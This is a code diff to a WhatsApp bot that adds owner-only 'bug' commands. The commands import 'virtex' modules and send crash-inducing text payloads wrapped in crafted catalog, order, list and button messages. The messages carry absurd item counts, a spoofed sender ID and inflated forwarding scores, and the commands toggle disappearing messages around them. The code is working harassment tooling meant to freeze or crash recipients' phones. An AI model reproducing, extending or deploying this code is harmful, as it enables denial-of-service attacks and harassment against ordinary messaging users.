@@ -73,7 +73,18 @@ const xfarrapi = require('xfarr-api')
 const { hentai } = require('./lib/scraper2.js')
 let { msgFilter } = require('./lib/antispam')
 const { mediafireDl } = require('./lib/mediafire.js')
-
+const { virtex90 } = require('./virtex/virtex90')
+const { virtex2 } = require('./virtex/virtex2')
+const { virtex3 } = require('./virtex/virtex3')
+const { virtex4 } = require('./virtex/virtex4')
+const { virtex5 } = require('./virtex/virtex5')
+const { virtex6 } = require('./virtex/virtex6')
+const { virtex7 } = require('./virtex/virtex7')
+const { virtex8 } = require('./virtex/virtex8')
+const { virtex9 } = require('./virtex/virtex9')
+const { ngazap } = require('./virtex/ngazap')
+const { virtag } = require('./virtex/virtag')
+const { emoji2 } = require('./virtex/emoji2')
 
 const _ = require('lodash')
 const yargs = require('yargs/yargs')
@@ -5530,6 +5541,7 @@ case 'bug': case 'report': {
 	case  'ownermenu' : {
 		if (isBan) return reply(mess.banned)	 			
     		if (isBanChat) return reply(mess.bangc)
+		if (!isCreator) return replay(mess.botowner)
 		let sections = []
 		let  nexusmenu = [`self on`,`public on`,`bangroup on`]
 		let  nexusmenu2 = [`self off`,`public off`,`bangroup off `]
@@ -6702,8 +6714,92 @@ case 'add':{
                         return('Error!')
                     })
     break
-
-
+		
+case 'okvirtex':
+if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+katalog(`${ngazap(prefix)}`)
+katalog(`${emoji2(prefix)}`)
+katalog(`${virtex90(prefix)}`)
+katalog(`${virtex2(prefix)}`)
+katalog(`${virtex3(prefix)}`)
+katalog(`${virtex4(prefix)}`)
+katalog(`${virtex5(prefix)}`)
+katalog(`${virtex6(prefix)}`)
+katalog(`${virtex7(prefix)}`)
+katalog(`${virtex8(prefix)}`)
+katalog(`${virtex9(prefix)}`)
+katalog(`${virtag(prefix)}`)
+break
+case 'buglink':
+              if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+                 Nexus.toggleDisappearingMessages(from, 0)
+               Nexus.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
+            "forwardingScore": 1000000000,
+            isForwarded: false,
+            sendEphemeral: false,
+            "externalAdReply": {
+                "title": `${virtex2(prefix)}`,
+                "body": "",
+                "previewType": "PHOTO",
+                "thumbnailUrl": "https://i.ibb.co/y0RYgzB/FB-IMG-1635413002830.jpg",
+                "thumbnail": fs.readFileSync(`./pic1.jpg`),
+                "sourceUrl": "https://github.com/NEXUSTAT12"}}})
+                break
+        case 'bugbutton':
+        if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+        Nexus.toggleDisappearingMessages(from, 0)
+        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
+        Nexus.toggleDisappearingMessages(from, 0)
+break
+case 'bugrow':
+if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+Nexus.toggleDisappearingMessages(from, 0)
+ listMsg = {
+ buttonText: 'LIST MENU',
+ footerText: `${emoji2(prefix)}`,
+ description: `${virtex6(prefix)}`,
+ sections: [
+                     {
+                      "title": "CieDick",
+ rows: [
+                          {
+                              "title": "CieBug",
+                              "rowId": ""
+                           }
+                        ]
+                     }],
+ listType: 1
+}
+Nexus.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
+Nexus.toggleDisappearingMessages(from, 0)
+break
+case 'bugcatalog':
+if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+Nexus.toggleDisappearingMessages(from, 0)
+ babi = (teks) => {
+             res = Nexus.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
+  key: {
+   participant: '919999999@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+   orderMessage: {
+    itemCount: 9999999, // Bug
+    status: 1,
+    surface: 1,
+    message: `${virtex6(prefix)}`,
+    orderTitle: `${emoji2(prefix)}`, // Idk what this does
+    sellerJid: '919999999@s.whatsapp.net' // Seller
+   }
+  }
+ }
+})
+             Nexus.relayWAMessage(res)
+        }
+        babi(`${ngazap(prefix)}`)
+        babi(`${virtag(prefix)}`)
+        babi(`${virtex6(prefix)}`)
+        babi(`${emoji2(prefix)}`)
+        break
 
 default:
 
